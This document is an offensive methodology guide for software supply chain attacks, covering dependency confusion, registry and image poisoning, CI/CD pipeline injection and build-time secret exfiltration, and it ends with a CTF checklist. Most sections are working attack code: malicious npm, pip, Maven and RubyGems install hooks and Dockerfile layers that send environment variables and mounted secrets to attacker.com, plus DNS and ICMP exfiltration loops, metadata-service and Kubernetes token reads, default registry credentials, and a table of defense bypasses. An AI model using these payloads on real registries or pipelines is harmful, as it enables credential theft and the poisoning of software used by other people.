# Supply Chain Attack — Active Poisoning Methodology

This reference covers **offensive** supply chain attacks: dependency confusion, registry poisoning, CI/CD pipeline injection, and build-time secret exfiltration. Use when the target runs a build system that pulls packages from registries (npm, pip, maven, Docker/OCI) and you need to inject malicious code into the build process.

---

## Table of Contents

1. [Dependency Confusion](#1-dependency-confusion)
2. [Container Image Poisoning](#2-container-image-poisoning)
3. [CI/CD Pipeline Injection](#3-cicd-pipeline-injection)
4. [Build-Time Secret Exfiltration](#4-build-time-secret-exfiltration)
5. [Package Manager Install Hooks](#5-package-manager-install-hooks)
6. [CTF Supply Chain Attack Checklist](#6-ctf-supply-chain-attack-checklist)

---

## 1. Dependency Confusion

When a build system queries both a **private registry** and a **public registry** (npmjs.com, pypi.org, maven central), a higher-version package on the public registry can override the private one. This is because most package managers default to "highest version wins" across all configured sources.

### 1.1 Recon: Identify Internal Package Names

Look for internal/private package names that don't exist on public registries:

```bash
# From source code / lockfiles
grep -r '"dependencies"' package.json | grep '@company/'
cat requirements.txt | grep -v '==' | grep -v '#'
cat pom.xml | grep '<artifactId>' | grep -i internal

# From the build system UI (Jenkins/GitLab CI/OpsFlow)
# Check build logs for `npm install`, `pip install`, `mvn install`
# Internal packages often have names like: company-utils, internal-auth, ops-core

# From private registry API (if accessible)
curl -s http://registry.internal:4873/-/all | jq 'keys[]'           # Verdaccio
curl -s http://nexus.internal:8081/service/rest/v1/search?name=*    # Nexus
curl -s http://registry.internal/v2/_catalog                         # Docker
```

### 1.2 Check If Package Exists on Public Registry

```bash
# npm
curl -s https://registry.npmjs.org/<package-name> | jq '.error // .name'
# Returns "Not found" → available for takeover

# PyPI
curl -s https://pypi.org/pypi/<package-name>/json | jq '.info.name // "not found"'

# Maven Central
curl -s "https://search.maven.org/solrsearch/select?q=a:<artifactId>&rows=1" | jq '.response.numFound'
```

If the package doesn't exist on the public registry → **dependency confusion is possible**.

### 1.3 Create Malicious Package (npm example)

```json
{
  "name": "internal-auth-utils",
  "version": "99.0.0",
  "description": "...",
  "scripts": {
    "preinstall": "curl http://attacker.com/exfil?data=$(env | base64 -w0)"
  }
}
```

```bash
# Publish to public npm
npm publish
# When the build system runs `npm install`, it fetches v99.0.0 from public npm
# instead of v1.2.3 from private registry → preinstall hook executes
```

### 1.4 Create Malicious Package (pip example)

```python
# setup.py
import os, subprocess
from setuptools import setup
from setuptools.command.install import install

class Exploit(install):
    def run(self):
        # Exfil build environment secrets
        subprocess.Popen([
            'curl', f'http://attacker.com/exfil',
            '-d', os.popen('env').read()
        ])
        install.run(self)

setup(
    name='internal-auth-utils',
    version='99.0.0',
    cmdclass={'install': Exploit},
)
```

```bash
python setup.py sdist
twine upload dist/*
```

### 1.5 Defense-Aware Variants

| Defense | Bypass |
|---------|--------|
| Scoped packages (`@company/pkg`) | npm scopes are tied to org — register the org if unclaimed |
| Version pinning (`==1.2.3`) | Only works if lockfile is used; some CI skips lockfile |
| Hash verification | Rare in practice; most `pip install` doesn't use `--require-hashes` |
| Priority config (`.npmrc` `registry=`) | If `registry` is only private, safe; if both listed, vulnerable |
| Namespace reservation | Check if the namespace is actually reserved on public registry |

---

## 2. Container Image Poisoning

When a build pipeline pulls images from a registry (Docker Hub, Harbor, private registry), you can poison the image to inject code into the build.

### 2.1 Tag Override Attack

If you have push access to the registry (e.g., via Harbor default creds, anonymous push):

```bash
# Pull the legitimate image
docker pull registry.internal/ops/base-image:latest

# Add malicious layer
cat > Dockerfile.poison <<'EOF'
FROM registry.internal/ops/base-image:latest
RUN curl http://attacker.com/exfil?flag=$(cat /run/secrets/* 2>/dev/null | base64 -w0) || true
EOF

docker build -t registry.internal/ops/base-image:latest -f Dockerfile.poison .
docker push registry.internal/ops/base-image:latest
# Next build will pull the poisoned image
```

### 2.2 Typosquatting / Namespace Confusion

```bash
# If build uses: FROM company/admin-panel:latest
# And "company" org on Docker Hub is unclaimed:
docker tag malicious:latest company/admin-panel:latest
docker push company/admin-panel:latest
```

### 2.3 Build Arg / Secret Extraction from Image Layers

Even without poisoning, existing images may leak secrets:

```bash
# Pull and inspect image history
docker pull registry.internal/ops/admin:latest
docker history --no-trunc registry.internal/ops/admin:latest
# Look for: ENV SECRET_KEY=..., ARG DB_PASSWORD=..., COPY .env

# Extract filesystem
docker save registry.internal/ops/admin:latest | tar xf -
# Each layer is a tar — search for secrets
find . -name "*.tar" -exec tar tf {} \; | grep -i "flag\|secret\|key\|password\|\.env"
```

---

## 3. CI/CD Pipeline Injection

When you have access to the build system (Jenkins, GitLab CI, GitHub Actions, OpsFlow), inject commands into the build pipeline.

### 3.1 Build Configuration Poisoning

```bash
# If you can modify build config (Jenkinsfile, .gitlab-ci.yml, Dockerfile):
# Inject a build step that exfils secrets

# Jenkinsfile injection
echo 'stage("exfil") { steps { sh "curl http://attacker.com/exfil -d \$(env | base64 -w0)" } }' >> Jenkinsfile

# .gitlab-ci.yml injection
echo -e '\nexfil:\n  script: curl http://attacker.com/exfil -d $(env | base64 -w0)' >> .gitlab-ci.yml

# Dockerfile injection (if build uses user-controlled Dockerfile)
echo 'RUN curl http://attacker.com/exfil?f=$(cat /flag* | base64 -w0)' >> Dockerfile
```

### 3.2 Webhook / Build Trigger Abuse

```bash
# If the build system has a webhook trigger endpoint:
curl -X POST http://build.internal/api/trigger \
  -H 'Content-Type: application/json' \
  -d '{"ref": "main", "variables": {"INJECT": "; curl http://attacker.com/exfil?e=$(env|base64)"}}'
```

### 3.3 Shared Runner / Build Agent Escape

```bash
# On shared CI runners, check for:
# - Docker socket mounted: /var/run/docker.sock
# - Kubernetes service account: /var/run/secrets/kubernetes.io/
# - Cloud metadata: curl http://169.254.169.254/latest/meta-data/

ls -la /var/run/docker.sock
cat /var/run/secrets/kubernetes.io/serviceaccount/token
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

## 4. Build-Time Secret Exfiltration

Once you have code execution in the build environment, extract secrets (flag):

### 4.1 Environment Variables

```bash
# Most CI/CD systems inject secrets as env vars
env | grep -i "flag\|secret\|key\|token\|password\|credential"
printenv
cat /proc/self/environ | tr '\0' '\n'
```

### 4.2 Mounted Files

```bash
# Docker secrets
cat /run/secrets/*
ls -la /run/secrets/

# Kubernetes secrets
cat /var/run/secrets/kubernetes.io/serviceaccount/token
ls -la /var/run/secrets/

# Build context files
find / -maxdepth 4 -name "flag*" -o -name ".env" -o -name "*.key" -o -name "credentials*" 2>/dev/null
```

### 4.3 Exfiltration Methods

```bash
# HTTP — simplest
curl http://attacker.com/exfil -d "$(cat /flag* | base64 -w0)"

# DNS — bypasses most egress filters
flag=$(cat /flag* | base64 -w0)
nslookup ${flag}.attacker.com

# DNS chunked (for long data)
data=$(cat /flag* | base64 -w0)
for i in $(seq 0 63 ${#data}); do
  chunk=${data:$i:63}
  nslookup ${chunk}.${i}.attacker.com
done

# ICMP — if DNS is blocked too
ping -c 1 -p $(cat /flag* | xxd -p | head -c 32) attacker.com

# Build output — embed in build artifact
echo "FLAG=$(cat /flag*)" >> /app/build/output.log
```

### 4.4 Blind Exfiltration (No Outbound Network)

When the build environment has no outbound connectivity:

```bash
# Embed in build artifact / image label
docker build --label "flag=$(cat /flag*)" .

# Write to shared volume / cache that persists between builds
echo "$(cat /flag*)" > /cache/exfil.txt

# If registry is internal — push a new image with the secret as a tag
docker tag scratch registry.internal/exfil:$(cat /flag* | tr -d '{}')
docker push registry.internal/exfil:$(cat /flag* | tr -d '{}')

# Modify an existing artifact the attacker can later retrieve
echo "$(cat /flag*)" >> /app/public/robots.txt
```

---

## 5. Package Manager Install Hooks

Each package manager has hooks that execute during install — the primary code execution vector for dependency confusion.

### npm (Node.js)

```json
{
  "scripts": {
    "preinstall": "node -e \"require('child_process').exec('curl http://attacker.com/?d='+require('os').hostname())\"",
    "install": "...",
    "postinstall": "..."
  }
}
```

> npm v7+ runs lifecycle scripts in a restricted environment by default. Use `--ignore-scripts=false` or target older npm versions.

### pip (Python)

```python
# setup.py — executes during `pip install`
from setuptools import setup
from setuptools.command.install import install
import os

class Backdoor(install):
    def run(self):
        os.system("curl http://attacker.com/exfil -d $(env | base64 -w0)")
        install.run(self)

setup(name='target-pkg', version='99.0.0', cmdclass={'install': Backdoor})
```

### Maven (Java)

```xml
<!-- pom.xml — exec-maven-plugin runs during build -->
<plugin>
  <groupId>org.codehaus.mojo</groupId>
  <artifactId>exec-maven-plugin</artifactId>
  <executions>
    <execution>
      <phase>initialize</phase>
      <goals><goal>exec</goal></goals>
      <configuration>
        <executable>sh</executable>
        <arguments>
          <argument>-c</argument>
          <argument>curl http://attacker.com/exfil -d $(env | base64 -w0)</argument>
        </arguments>
      </configuration>
    </execution>
  </executions>
</plugin>
```

### RubyGems (Ruby)

```ruby
# ext/extconf.rb — executes during `gem install`
require 'mkmf'
system("curl http://attacker.com/exfil -d $(env | base64 -w0)")
create_makefile('dummy')
```

### Go Modules

Go modules don't have install hooks, but `go generate` can execute arbitrary commands if `.go` files contain `//go:generate` directives.

---

## 6. CTF Supply Chain Attack Checklist

For CTF challenges involving build systems / CI/CD / supply chains:

```
□ Recon the build system
  □ What platform? (Jenkins, GitLab CI, custom OpsFlow, etc.)
  □ What triggers builds? (cron, webhook, git push, manual)
  □ What packages/images does it pull? From where?
  □ Can you access the private registry? (Harbor/Nexus/Verdaccio/npm)

□ Registry access
  □ Try default creds (Harbor: admin/Harbor12345, Nexus: admin/admin123)
  □ Try anonymous access (GET /v2/_catalog, GET /-/all)
  □ Can you push images/packages? (anonymous push, weak ACL)
  □ List all packages/images and their versions

□ Dependency confusion
  □ Identify internal package names from build logs/config
  □ Check if they exist on public registry
  □ Create higher-version package with install hook
  □ Wait for next build to pull your package

□ Image poisoning
  □ Can you push to the private registry?
  □ Tag override: rebuild base image with malicious layer
  □ Wait for next build to use poisoned image

□ Build config injection
  □ Can you modify Jenkinsfile / Dockerfile / .gitlab-ci.yml?
  □ Can you modify build parameters / environment variables?
  □ Can you trigger a build with custom parameters?

□ Secret extraction
  □ env / printenv / /proc/self/environ
  □ /run/secrets/* / mounted volumes
  □ find / -name "flag*"
  □ Exfil via HTTP/DNS/build artifact
```
